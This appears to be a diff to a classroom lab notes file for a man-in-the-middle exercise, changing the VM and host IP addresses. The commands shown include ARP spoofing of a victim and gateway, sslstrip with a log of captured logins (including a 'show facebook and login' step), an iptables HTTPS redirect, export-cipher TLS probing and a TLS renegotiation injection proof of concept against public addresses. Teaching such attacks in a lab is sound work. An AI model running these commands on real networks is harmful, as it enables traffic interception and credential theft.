@@ -1,4 +1,8 @@
 Gateway: 192.168.0.1
+VM: 192.168.0.3
+Host: 192.168.0.2
+
+Gateway: 192.168.0.1
 VM: 192.168.0.8
 Host: 192.168.0.12
 
@@ -20,7 +24,7 @@ tar -xzvf openssl_decrypt_homework.tar.gz
 openssl rsautl -decrypt -in important_message_encrypted -out plaintext -inkey my.key
 
 sslscan 138.91.119.153
-wireshark ip.src == 192.168.0.8
+wireshark ip.src == 192.168.0.3
 openssl s_client -connect 138.91.119.153:443 -cipher EXP-RC4-MD5
 
 *********************************
@@ -61,9 +65,9 @@ sslstrip -p -l 1234 -f
 
 tail -f sslstrip.log
 
-arpspoof -i eth0 -t 192.168.0.12 192.168.0.1
+arpspoof -i eth0 -t 192.168.0.2 192.168.0.1
 
-arpspoof -i eth0 -t 192.168.0.1 192.168.0.12
+arpspoof -i eth0 -t 192.168.0.1 192.168.0.2
 
 show facebook and login
 
@@ -87,6 +91,6 @@ cat /proc/sys/net/ipv4/ip_forward
 
 iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
 
-arpspoof -i eth0 -t 192.168.0.12 192.168.0.1
-arpspoof -i eth0 -t 192.168.0.1 192.168.0.12
-tls-renegotiation-poc.py -l 8080 -b 192.168.0.8 -t 191.238.51.50:443 --inject "GET /mitm/?m=InjectedMessage HTTP/1.1"
+arpspoof -i eth0 -t 192.168.0.2 192.168.0.1
+arpspoof -i eth0 -t 192.168.0.1 192.168.0.2
+tls-renegotiation-poc.py -l 8080 -b 192.168.0.3 -t 191.238.51.50:443 --inject "GET /mitm/?m=InjectedMessage HTTP/1.1"
